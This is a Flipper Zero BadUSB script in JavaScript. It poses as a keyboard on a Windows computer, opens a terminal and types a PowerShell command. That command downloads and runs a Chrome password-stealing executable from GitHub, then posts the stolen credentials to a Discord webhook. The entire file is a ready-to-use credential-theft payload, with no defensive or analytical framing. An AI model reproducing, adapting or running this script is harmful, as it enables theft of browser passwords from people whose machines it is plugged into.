let badusb = require("badusb");

let script=[
   "$webhookUrl = '<discordWebhook>';",
   "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chromeStealer.exe';",
   "$exePath = '.\\chromeStealer.exe';",
    "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
   "$commandOutput = & $exePath;",
   "$commandOutput = & '.\\chromeStealer.exe' | Out-String;",
    "if ($commandOutput.Length -gt 2000) {$commandOutput = $commandOutput.Substring(0, 2000)}",
    "$discordData = @{",
    "    'username' = 'Flipper';",
    "    'content' = $commandOutput;",
    "};",
    "$jsonData = ConvertTo-Json -InputObject $discordData;",
    "Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';"
];

let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/en-US.kl" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "x");
delay(300);
badusb.press("i");
delay(3000);
print("Running payload");
badusb.println(command, 10);
badusb.press("ENTER");
badusb.quit();
print("done :)");


